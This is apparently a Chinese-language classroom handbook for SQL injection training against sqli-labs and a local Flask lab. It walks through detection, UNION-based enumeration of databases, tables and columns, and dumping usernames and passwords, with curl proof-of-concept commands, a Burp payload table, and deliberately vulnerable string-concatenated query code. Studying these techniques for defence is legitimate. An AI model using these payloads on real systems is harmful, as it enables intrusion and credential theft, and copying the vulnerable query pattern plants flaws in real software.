# 🎯 SQL 注入漏洞 — 学习与训练手册

> **课程项目：** scuShiXun_class01  
> **学习日期：** 2026-07-19  
> **目标：** 掌握 SQL 注入漏洞的检测、利用与防御全流程

---

## 目录

1. [注入点查找](#一注入点查找)
2. [数字型 vs 字符型注入判断](#二数字型-vs-字符型注入判断)
3. [字符注入 — 闭合方式](#三字符注入--闭合方式)
4. [默认查询列数探测](#四默认查询列数探测-group-by--order-by)
5. [查询回显位置确认](#五查询回显位置)
6. [数据库名查询](#六查询数据库名)
7. [表名查询](#七查找表名)
8. [列名查询](#八查找列名)
9. [数据获取](#九获取数据)
10. [漏洞原理分析](#十漏洞原理)
11. [POC 代码与详解](#十一poc-代码与详解)
12. [Burp Suite 测试方法](#十二burp-suite-测试方法)

---

## 一、注入点查找

**目标：** 找到 Web 应用中与数据库交互的入口点。

### 常见注入点位置

| 位置 | 示例 | 说明 |
|------|------|------|
| **URL 参数** | `?id=1`、`?page=2` | GET 请求中的查询参数 |
| **表单提交** | 登录、搜索、注册 | POST 请求中的表单字段 |
| **Cookie** | `Cookie: user=admin` | 服务端读取 Cookie 拼接 SQL |
| **HTTP Header** | `User-Agent`、`Referer` | 少数应用会记录请求头到数据库 |

### 探测方法

```bash
# 基础探测 — 加单引号看是否报错
http://example.com/page?id=1'       # → 报错 → 可能存在注入
http://example.com/page?id=1 and 1=1 # → 正常返回
http://example.com/page?id=1 and 1=2 # → 返回不同 → 确认注入
```

### 训练靶场

本训练基于 **sqli-labs** 靶场（Less-1 ~ Less-4）：
```
http://172.19.19.113:81/sql_my/Less-1/?id=1
http://172.19.19.113:81/sql_my/Less-2/?id=1
http://172.19.19.113:81/sql_my/Less-3/?id=1
```

---

## 二、数字型 vs 字符型注入判断

### 数字型注入

**特征：** SQL 语句直接拼接数字，**不带引号**。

```sql
-- 后台 SQL 示例
SELECT * FROM users WHERE id = $id;
```

**判断方法：**

```bash
# 用数学表达式测试
http://example.com/page?id=2-1       # = id=1，返回 id=1 的内容
http://example.com/page?id=2         # 对比结果是否一致

# 确认：
# 如果 2-1 返回的内容与 id=1 相同 → 数字型注入 ✅
```

### 字符型注入

**特征：** SQL 语句用**引号包裹**用户输入。

```sql
-- 后台 SQL 示例
SELECT * FROM users WHERE id = '$id';
```

**判断方法：**

```bash
# 加引号测试
http://example.com/page?id=1'        # → 报错（多出一个引号导致语法错误）
http://example.com/page?id=1' --+    # → 正常返回（注释掉后面的引号）

# 确认：
# 1' 报错，1' --+ 正常 → 字符型注入 ✅
```

### 快速对比表

| 测试 Payload | 数字型 | 字符型 |
|:------------:|:------:|:------:|
| `id=1` | ✅ 正常 | ✅ 正常 |
| `id=1'` | ❌ 可能报错 | ❌ 报错 |
| `id=1' --+` | ❌ 可能报错 | ✅ 正常 |
| `id=2-1` | ✅ 和 id=1 结果相同 | ❌ 一般无效 |

---

## 三、字符注入 — 闭合方式

**核心概念：** 字符型注入的关键在于**闭合前方引号**并**注释后方代码**。

### 三种常见闭合方式

```sql
-- 方式 1：单引号闭合
SELECT * FROM users WHERE id = '1' --+';
-- Payload: id=1' --+

-- 方式 2：双引号闭合
SELECT * FROM users WHERE id = "1" --+";
-- Payload: id=1" --+

-- 方式 3：括号+引号闭合
SELECT * FROM users WHERE id = ('1') --+');
-- Payload: id=1') --+
```

### 闭合探测方法

```bash
# 逐级测试闭合方式
id=1' --+         # 单引号闭合
id=1" --+         # 双引号闭合
id=1') --+        # 单引号+括号
id=1") --+        # 双引号+括号
id=1')) --+       # 单引号+双层括号
id=1")) --+       # 双引号+双层括号
```

**关键符号说明：**

| 符号 | 含义 |
|:----:|------|
| `'` | 闭合前引号 |
| `--+` | 注释后方代码（`+` 在某些 DB 中等价空格 `-- `） |
| `#` | MySQL 注释符（`--+` 的替代） |
| `%23` | `#` 的 URL 编码 |

---

## 四、默认查询列数探测（GROUP BY / ORDER BY）

**目的：** 确定 SELECT 查询返回了多少列，为 UNION 注入做准备。

### 方法一：ORDER BY（推荐）

```sql
-- 逐步增加列号
ORDER BY 1   -- 正常
ORDER BY 2   -- 正常
ORDER BY 3   -- 正常
ORDER BY 4   -- 报错 → 说明只有 3 列
```

```bash
# 示例 URL
http://example.com/page?id=1 order by 1 --+
http://example.com/page?id=1 order by 2 --+
http://example.com/page?id=1 order by 3 --+
http://example.com/page?id=1 order by 4 --+  # ← 报错时 = 列数
```

**原理：** `ORDER BY` 按第 N 列排序，如果 N 超过实际列数则报错。

### 方法二：GROUP BY

```sql
GROUP BY 1   -- 正常
GROUP BY 2   -- 正常
GROUP BY 3   -- 报错 → 3 列
```

### 二分法加速

```bash
# 列数不确定时用二分法快速定位
order by 50 --+  # 报错？那列数 < 50
order by 25 --+  # 报错？那列数 < 25
order by 12 --+  # 报错？那列数 < 12
order by 6  --+  # 正常？那列数在 6~12
order by 9  --+  # ...以此类推
```

---

## 五、查询回显位置

**目的：** 确定页面上的哪些位置会显示查询结果，用于 UNION 注入的数据展示。

### 方法：UNION SELECT + 数字标记

```bash
# 假设 3 列
id=-1 union select 1,2,3 --+
```

```sql
-- 生成 SQL
SELECT * FROM users WHERE id = -1 UNION SELECT 1,2,3 --+';
```

**为什么用 `id=-1`？**

- 让第一个 SELECT 返回 0 行（没有 id 为 -1 的用户）
- UNION 只显示第二个 SELECT 的结果（数字标记）

**页面返回：**

```
ID: 1           # ← 第 1 列在此位置显示
Username: 2     # ← 第 2 列在此位置显示
Password: 3     # ← 第 3 列在此位置显示
```

有了回显位置，就可以把 `1,2,3` 替换成 `database(), user(), version()` 来获取数据库信息。

---

## 六、查询数据库名

### 内置函数

```sql
DATABASE()    -- 当前数据库名
USER()        -- 当前数据库用户
VERSION()     -- 数据库版本
@@DATADIR     -- 数据存储路径
```

### 利用示例

```bash
# 将回显位置的数字替换为 database()
http://example.com/page?id=-1 union select 1,database(),3 --+
```

```sql
-- 生成 SQL
SELECT * FROM users WHERE id = -1 UNION SELECT 1, DATABASE(), 3 --+';
```

**结果：** 页面上回显位置 2 显示数据库名，例如 `security`。

---

## 七、查找表名

**核心思路：** MySQL 中所有数据库的表信息存储在 `information_schema.tables` 系统表中。

### 语法

```sql
SELECT group_concat(table_name)
FROM information_schema.tables
WHERE table_schema='数据库名'
```

### 利用示例

```bash
# 查询 security 数据库中的所有表
http://example.com/page?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
```

**返回结果示例：**
```
emails,referers,uagents,users
```

### 函数说明

| 函数 | 作用 |
|:----:|------|
| `group_concat()` | 将多行合并为一行，逗号分隔 |
| `information_schema.tables` | 系统表，存储所有数据库的表信息 |
| `table_schema` | 数据库名 |
| `table_name` | 表名 |

---

## 八、查找列名

**核心思路：** 列信息存储在 `information_schema.columns` 系统表中。

### 语法

```sql
SELECT group_concat(column_name)
FROM information_schema.columns
WHERE table_name='表名' AND table_schema='数据库名'
```

### 利用示例

```bash
# 查询 security 数据库 users 表中的所有列
http://example.com/page?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='security' --+
```

**返回结果示例：**
```
id,username,password,email,phone
```

---

## 九、获取数据

**最后一步：** 利用 UNION SELECT 从目标表获取数据。

### 语法

```sql
SELECT group_concat(列名1,'~',列名2)
FROM 表名
```

### 利用示例

```bash
http://172.19.19.113:81/sql_my/Less-2/?id=0 union select 1,group_concat(username,'~',password),3 from users --+
```

**返回结果：**
```
admin~admin123, alice~alice2025, ...
```

### 多种分隔格式

```sql
-- 波浪线分隔
group_concat(username,'~',password)

-- 带冒号，更清晰
group_concat(username,':',password)

-- HTML 换行
group_concat(username,'<br>',password)
```

---

## 十、漏洞原理

### 漏洞 1：字符串拼接 SQL 查询

当用户输入直接拼接到 SQL 语句中时，输入中的特殊字符会改变 SQL 的语法结构。

```python
# ❌ 漏洞代码 — 字符串拼接
query = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"

# ❌ 搜索功能 — 也是拼接
query = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
```

**正常输入：**
```sql
SELECT * FROM users WHERE username LIKE '%admin%'
```

**恶意输入：**
```sql
-- 输入 keyword = ' OR 1=1 --
SELECT * FROM users WHERE username LIKE '%' OR 1=1 --%'
--                                           ^^^^^^^^
--                                           永真条件 → 返回所有用户
```

### 漏洞 2：无任何输入过滤

用户输入直接传入 SQL 语句，没有做任何转义、过滤或参数化处理。

### 漏洞 3：搜索结果回显

搜索结果直接在页面上以表格形式展示，攻击者可通过 UNION 注入获取任意数据。

### 漏洞根因总结

```
用户输入 → [❌ 无过滤] → [❌ 字符串拼接] → SQL 语句 → 数据库 → [❌ 结果回显]
                                                              ↓
                                              攻击者获取所有数据
```

**防御方案（参考）：**
- ✅ 使用参数化查询（Prepared Statement）
- ✅ 输入校验与转义
- ✅ 最小权限原则

---

## 十一、POC 代码与详解

### POC 1：UNION 注入获取任意数据

```bash
# 先登录获取 session
curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/cookies.txt

# UNION 注入：向搜索结果的表中插入自定义数据
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" -b /tmp/cookies.txt | grep "inj"
```

**预期输出：** 搜索结果中出现 `inj` 用户名。

**原理详解：**

```
原 SQL：
SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'

输入 keyword = ' UNION SELECT 1,'inj','inj@x.com','138'--

生成 SQL：
SELECT * FROM users
WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'

UNION 将第二个查询的结果合并到结果集中
第二个查询返回：1, inj, inj@x.com, 138
```

**为什么列数必须是 4？**
```sql
SELECT * FROM users          返回 4 列 (id, username, email, phone)
UNION SELECT 1,'inj','inj@x.com','138'  也必须返回 4 列
-- 列数不匹配会报错：SELECTs to the left and right of UNION do not have the same number of result columns
```

### POC 2：OR 注入搜索全部用户

```bash
# OR 注入：让 WHERE 条件永远为真
curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" -b /tmp/cookies.txt
```

**预期输出：** 显示数据库中**所有用户**。

**原理详解：**

```
原 SQL：
SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'

输入 keyword = ' OR '1'='1

生成 SQL：
SELECT * FROM users
WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
                       ^^^^^^^^^^^
                       永真条件，所有行都匹配

结果：返回 users 表的全部数据
```

### POC 3：注册功能 SQL 注入

```bash
# 注册时注入 SQL
curl http://127.0.0.1:5000/register \
  -d "username=hacker', 'pass', 'h@x.com', '123')--&password=irrelevant"
```

**原理：** 利用注册功能闭合 SQL 语句插入额外数据。

---

## 十二、Burp Suite 测试方法

### 测试流程

```
Step 1: 拦截请求
  └─ 登录后，拦截 GET /search?keyword=admin 请求

Step 2: 发送到 Repeater
  └─ 右键 → Send to Repeater (Ctrl+R)

Step 3: 修改 keyword 参数，测试以下 Payload
```

### Payload 测试表

| 测试序号 | Payload（需 URL 编码） | 预期现象 |
|:--------:|------------------------|----------|
| ① | `admin' OR '1'='1` | 返回**所有用户** → 确认注入存在 |
| ② | `' UNION SELECT 1,2,3,4--` | 显示 `1,2,3,4` 数字代替数据 → 确认 4 列 |
| ③ | `' UNION SELECT 1,database(),user(),version()--` | 显示数据库名、用户、版本 |
| ④ | `' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='数据库名'--` | 显示所有表名 |
| ⑤ | `' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--` | 显示 users 表所有列 |
| ⑥ | `' UNION SELECT 1,group_concat(username,'~',password),3,4 FROM users--` | **获取所有用户名和密码** |

### Burp Suite 使用技巧

```bash
# 编码技巧 — Burp 的 URL 编码功能会自动处理
# 发送前确保 Payload 中的特殊字符被正确编码：

'         →  %27
空格       →  %20 或 +
#         →  %23
--        →  --（发送时不变）
```

---

## 学习路线图

```
Level 1: 基础注入
  ├── 找注入点
  ├── 判断数字/字符型
  ├── 确定闭合方式
  └── 探测列数

Level 2: 信息收集
  ├── 确定回显位置
  ├── 查数据库名
  ├── 查表名
  └── 查列名

Level 3: 数据获取
  ├── UNION 注入
  ├── OR 万能条件
  └── sqlmap 自动化

Level 4: 进阶
  ├── 盲注（布尔/时间）
  ├── 报错注入
  ├── 堆叠注入
  └── 文件读写
```

---

> **Happy Hacking!** 🚀  
> 本手册配套靶场：sqli-labs / DVWA / 自建 Flask SQL 注入训练平台
